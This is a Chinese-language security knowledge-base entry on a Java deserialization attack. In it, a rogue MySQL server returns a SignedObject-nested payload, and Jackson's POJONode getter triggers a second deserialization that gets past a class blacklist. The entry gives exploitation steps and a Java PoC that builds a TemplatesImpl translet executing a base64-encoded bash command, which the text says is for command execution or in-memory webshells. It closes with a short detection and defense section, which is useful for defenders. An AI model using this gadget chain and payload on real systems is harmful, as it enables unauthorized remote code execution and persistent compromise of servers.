---
id: web-java-deserialization-fake-mysql-signedobject-jackson-second-order-bypass
title: 恶意 MySQL 服务端在结果列里回吐 SignedObject 嵌套流：驱动侧 readObject 被类黑名单限制时，用 Jackson POJONode getter 触发 SignedObject.getObject 完成二次反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: fake-mysql-signedobject-pojo-node-second-order-deserialization
tags:
- java
- deserialization
- jdbc
- mysql
- fake-server
- signedobject
- jackson
- pojonode
- second-order
- gadget
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:44:27+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。CheckClass 用 javassist 删/改写 com.mysql.jdbc.ResultSetImpl.getBytes 插入 NewObjectInputStream.readObject、SignedObjectBAVEPoC 内外两层 BAVE(val=POJONode(...))、DSA KeyPair 构造 SignedObject、生成端删 BaseJsonNode.writeReplace 均与正文代码一致；SignedObject.getObject 内层裸流绕过外层类黑名单的机理正确。dedup 最高外部候选 jackson-signedobject-getobject-short-chain(0.289) 入口与触发点不同、bave-pojonode-signedobject(0.230) 内层为业务类 SSRF 落盘而非伪 MySQL 结果列，非同链。未验证点：外层『类名黑名单/resolveClass 前缀』由正文『checkclass 变相 ban 了俩类』与 NewObjectInputStream 推断，原文未贴过滤器实现；PoC 未执行，末段只有『成功打入内存马』无回显。原文无受影响版本，未 set-versions。
url: /docs/web/java/deserialization/web-java-deserialization-fake-mysql-signedobject-jackson-second-order-bypass/
draft: false
kb_aliases:
- SignedObject 二次反序列化
- POJONode 触发 getObject
- 恶意 MySQL 返回嵌套序列化流
- ResultSetImpl.getBytes 反序列化
- 二次反序列化绕过 BAVE 黑名单
---

## 一句话结论

当目标应用连上攻击者控制的 MySQL 服务端、并在读取结果列时执行 `readObject`（驱动 `autoDeserialize`，或被业务代码用 javassist 改写 `ResultSetImpl.getBytes` 强行插入反序列化）时，如果这条链上的类被黑名单限制（例如禁掉 `BadAttributeValueExpException` 与 Xalan 等 gadget 类），可以只回吐一个 `java.security.SignedObject`：`SignedObject.getObject()` 内部会新建一个**不带任何过滤器**的 `ObjectInputStream` 反序列化其 `content`，再由 Jackson 的 `POJONode.toString()`（`ObjectMapper.writeValueAsString` 按 getter 序列化）调用 `getObject()` 把内层 payload 取出来继续执行，形成"二次反序列化"绕过。

## 原理

- **触发点可被业务代码搬到 `getBytes`**：MySQL 驱动的 `autoDeserialize` 是在取结果列时反序列化；本篇环境更进一步——`CheckClass` 用 javassist 把 `com.mysql.jdbc.ResultSetImpl.getBytes(int)` 改写成"取到字节后先 `new ObjectInputStream(...).readObject()` 再返回"，即把 sink 直接钉在驱动的 `getBytes` 上。只要业务执行任意查询并读该列，服务端返回的序列化字节就会被反序列化。
- **驱动侧的类过滤只能拦直接出现的类**：`resolveClass`/`jdk.serialFilter` 一类机制按流中出现的 `ObjectStreamClass` 逐个判断，黑名单（如 `com.sun.org.apache.xalan.internal.xsltc.trax`、`javax.management.BadAttributeValueExpException`）可以把外层 payload 的类全拦掉。
- **`SignedObject` 是天然的"嵌套无过滤流"载体**：`java.security.SignedObject` 构造时把任意 `Serializable` 对象序列化进 `content` 字段；`getObject()` 内部执行 `new ObjectInputStream(new ByteArrayInputStream(content)).readObject()`，这个内层 OIS 是普通实例，不继承外层的黑名单过滤器。于是"外层只出现 `SignedObject`（`java.security` 包，通常不在黑名单）"就能把任意类偷渡进内层。
- **需要一条 Getter 触发链**：`SignedObject.readObject()` 不会自动调用 `getObject()`，必须由上层 getter 触发。Jackson 的 `POJONode.toString()` 走 `BaseJsonNode.toString → InternalNodeMapper.nodeToString → ObjectMapper.writeValueAsString`，按 bean 语义序化对象时会调用其 getter；`getObject()` 正是 `SignedObject` 的合法 getter，因此 `POJONode.toString()` 会顺带触发内层反序列化。
- **外层用 BAVE 兜住整个开关**：`BadAttributeValueExpException.readObject` 会调用 `val.toString()`（JDK8），把 `val` 反射设为 `POJONode(SignedObject(...))` 即可从"反序列化即触发 hashCode/equals"的最外层一路走到 Jackson → `SignedObject.getObject` → 内层 `TemplatesImpl`/内存马载荷。
- **为什么是二次而不是一次**：外层流只让目标类看到 `SignedObject` + `POJONode`（Jackson 在 classpath 上时属常规类），内层 `POJONode(TemplatesImpl)` 的 `com.sun.org.apache.xalan...` 与 `javax.management` 从未出现在外层流的类描述符里，黑名单无从命中。

## 触发条件

- 应用会把连接指向攻击者控制的 MySQL 服务端（JDBC URL 可控、配置可写、或被诱导连接），且驱动/业务代码对结果列执行 `readObject`（`autoDeserialize=true` 或代码内 `getBytes` 被改写）。
- classpath 存在 Jackson（`com.fasterxml.jackson.databind.node.POJONode`）与 JDK 的 `TemplatesImpl`/Xalan（目标为 JDK8 时最直接），即"能写内存马/执行字节码"的内层 gadget 可用。
- 驱动侧过滤为类名黑名单（`resolveClass` 前缀判断或 `jdk.serialFilter` 的 deny 列表），没有禁止 `java.security.SignedObject` 与 `com.fasterxml.jackson.databind.node.*`。
- 生成端能修改 `BaseJsonNode.writeReplace`（用 javassist 删除），否则 `POJONode` 在序列化时会被替换成其它节点，目标端还原不出 `POJONode`。

## 利用步骤

1. 确认 sink：目标是否 `autoDeserialize`，或业务自带的 `ResultSetImpl.getBytes` 改造（本篇是后者）；确认连上伪 MySQL 后会读取该列。
2. 生成内层 payload：Javassist 造 `AbstractTranslet` 子类（构造函数/静态块注册内存马或执行命令），塞进 `TemplatesImpl` 的 `_bytecodes`，`_name` 任意、`_tfactory` 置 null。
3. 组装内层：`POJONode(templatesImpl)` → 放进 `BadAttributeValueExpException.val`（反射）→ 用 DSA `KeyPairGenerator` 生成密钥，`new SignedObject(innerBave, privateKey, Signature.getInstance("DSA"))` 把它序列化进 `content`。
4. 组装外层：`POJONode(signedObject)` → 反射设进第二个 `BadAttributeValueExpException.val`。
5. 生成端删掉 `com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace`，再把外层对象 `serialize` 成字节，作为伪 MySQL 服务端在结果列里返回的"字段值"。
6. 触发查询（访问业务接口让应用连库并读列）；驱动/被改写的 `getBytes` 先反序列化外层 → `BAVE.readObject` 调 `toString` → `POJONode.toString` → Jackson getter → `SignedObject.getObject` → 内层 `POJONode`+`TemplatesImpl` 加载字节码，命令执行/内存马落地。

## PoC

生成端骨架（原文 `SignedObjectBAVEPoC`）：

```java
ClassPool pool = ClassPool.getDefault();
CtClass base = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
base.removeMethod(base.getDeclaredMethod("writeReplace"));
base.toClass();

// 内层：TemplatesImpl 承载内存马/命令字节码
CtClass ct = pool.makeClass("a");
ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));
CtConstructor ctor = new CtConstructor(new CtClass[]{}, ct);
ctor.setBody("Runtime.getRuntime().exec(\"bash -c {echo,<base64>}|{base64,-d}|{bash,-i}\");");
ct.addConstructor(ctor);
TemplatesImpl tpl = new TemplatesImpl();
setFieldValue(tpl, "_bytecodes", new byte[][]{ct.toBytecode()});
setFieldValue(tpl, "_name", "bbb");
setFieldValue(tpl, "_tfactory", null);

// 内层触发：BAVE(val = POJONode(TemplatesImpl))
BadAttributeValueExpException inner = new BadAttributeValueExpException(null);
setFieldValue(inner, "val", new POJONode(tpl));

// 二次反序列化载体
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject so = new SignedObject(inner, kp.getPrivate(), Signature.getInstance("DSA"));

// 外层触发：BAVE(val = POJONode(SignedObject))
BadAttributeValueExpException outer = new BadAttributeValueExpException(null);
setFieldValue(outer, "val", new POJONode(so));
System.out.println(Base64.getEncoder().encodeToString(serialize(outer)));
```

把输出的字节放进伪 MySQL 服务端的结果列（本篇环境由 `CheckClass` 改写的 `ResultSetImpl.getBytes` 触发 `readObject`）。

## 变体与关联

- **外层触发点变体**：`EventListenerList → UndoManager/Vector → toString`（JDK17 仍可用）、`HashMap` 键碰撞 + `XString.equals`、`TextAndMnemonicHashMap.get` 等都可替换 BAVE；这是"外层"的自由度。
- **内层 payload 变体**：不限 `TemplatesImpl`——`POJONode` 的可序列化对象树、CB/CC 链、内存马字节码都可以放进 `SignedObject.content`，因为内层 OIS 无过滤器。
- **投递通道变体**：除伪 MySQL 的 `autoDeserialize` 外，任何"服务端可控字节 + 目标侧 `readObject`"的位置都等价：LDAP `javaSerializedData`、RMI 返回值、Redis/HTTP 缓存里的序列化 blob、MQ 消息体。
- **关联**：`web-java-deserialization-jackson-signedobject-getobject-short-chain`（同为 `SignedObject` + `POJONode` 的嵌套无过滤原理，但外层触发是 `EventListenerList`、入口是本地反序列化接口，且重点在短链构造）、`web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass`（`SignedObject` 内层无过滤的机制来源）、`web-java-deserialization-mysql-jdbc-url-autodeserialize-rce`、`web-java-deser-fastjson-mysql-jdbc-autodeserialize`（伪 MySQL 投递通道）、`web-java-deserialization-fake-mysql-custom-gadget-user-key-newline`（伪服务端侧的 payload 配置）。
- **边界**：驱动/业务没有对结果列做 `readObject`、外层过滤把 `java.security` 或 Jackson 节点类也列入 deny、生成端未处理 `BaseJsonNode.writeReplace` 导致 `POJONode` 被替换、classpath 无 Jackson 或无可用内层 gadget、JDK 高版本 `TemplatesImpl` 模块封装未处理时，该链不成立。

## 检测与防御

- **检测**：数据库连接指向陌生地址/非常规端口后，应用出现 `ResultSetImpl.getBytes`/`getObject` 与 `ObjectInputStream.readObject` 相邻的异常栈；序列化字节里出现 `java.security.SignedObject`、`com.fasterxml.jackson.databind.node.POJONode`、`javax.management.BadAttributeValueExpException` 组合（可在 JDBC 代理或 RASP 侧对 `readObject` 入参做类名快照）；进程出现字节码加载/内存马注册（新增 `Servlet`、`Filter`、`Listener` 或 `TemplatesImpl` 类加载日志）。
- **防御**：JDBC URL 与连接参数白名单，禁止 `autoDeserialize`、`socketFactory`、拦截器等客户端可控属性；业务不要自定义 `ResultSetImpl` 去反序列化服务端数据（本篇的 `CheckClass` 就是"把漏洞写进驱动"的反面教材）；序列化层改用 `ObjectInputFilter` 白名单并注册 `SerialFilterFactory` 让嵌套流继承策略，或直接禁止 `java.security.SignedObject` 等嵌套流载体；内层防护依赖"限制反序列化后可达的 getter"，因此对 Jackson 多态/`POJONode` 的使用面也要收敛。
